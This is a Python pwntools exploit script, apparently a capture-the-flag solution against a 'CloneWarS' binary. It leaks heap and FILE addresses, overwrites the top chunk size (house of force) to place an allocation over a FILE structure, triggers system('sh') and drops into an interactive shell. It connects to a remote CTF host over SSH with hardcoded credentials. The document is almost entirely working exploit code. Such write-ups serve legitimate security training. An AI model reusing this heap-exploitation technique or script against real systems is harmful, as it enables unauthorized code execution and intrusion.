from pwn import *


def prepare_starship(conn, malloc_size, char, memset_size):
    conn.sendline("3") # Prepare starships
    conn.sendline(str(malloc_size))
    conn.sendline(char) # character to memset
    conn.sendline(str(memset_size)) # size to memset


def make_troopers(conn, size, value):
    conn.sendlineafter("Your choice: ", "4")
    conn.sendlineafter("Troopers to be deployed:", str(size)) 
    conn.sendlineafter("What kind of troopers?:", value)


def build_death_star(conn, malloc_size):
    conn.sendlineafter("Your choice: ", "1")
    conn.sendlineafter("Assemble death star: ", str(malloc_size))


def dark_side(conn):
    conn.sendlineafter("Your choice: ", "6")


def leak_FILE(conn):
    conn.sendlineafter("Your choice: ", "6")
    conn.recvuntil("File is at: ")
    line = conn.readline()
    addr = int(line)
    log.info("FILE at 0x%x", addr)
    return addr


def leak_heap(conn):
    conn.sendline("2") # R2D2
    conn.read()
    conn.sendline("D2") # not sure why
    conn.recvuntil("IS ....")

    line = conn.readline()
    parts = line.split(" ")

    #target = parts[7]
    addr = parts[1]
    addr = int(addr) - 0x110
    log.info("heap addr 0x%x", addr)
    return addr

def calc_pointer(heap_leak, file_leak):
    """
    Calculate the offsets after doing `house of force`
    heap base: (gdb) libs            # look for [heap] line
    top_chunk: x/20gx &main_arena    # look for pointer after zeros
    """
    heap = heap_leak - 0x1270 
    wild_chunk = heap + 0x12a0 + 8*4 # size of long 8*4
    victim = file_leak - wild_chunk
    return victim

def pwn(conn):
    # dummy alloc so our leak will work
    prepare_starship(conn, 0x10, "A", 0x10)
    heap_leak = leak_heap(conn)
    file_leak = leak_FILE(conn)

    # hijack top_chunk size 0xffffffff... 
    prepare_starship(conn, 0x10, "FF", 0x20)
    victim = calc_pointer(heap_leak, file_leak)

    # call alloc with speicif size so next call will overwrite FILE
    build_death_star(conn, victim)
    make_troopers(conn, 'sh', 'blablabla')

    # trigger _system()
    dark_side(conn)

    # Shell!
    conn.interactive()


def pwn_remote():
    session = ssh("yeet", "ctf2.kaf.sh", password="12345678", port=7000)
    conn = session.run("1")
    conn.read()
    pwn(conn)


def pwn_local():
    conn = process(['./CloneWarS'])
    pwn(conn)


if __name__ == '__main__':
    pwn_remote()
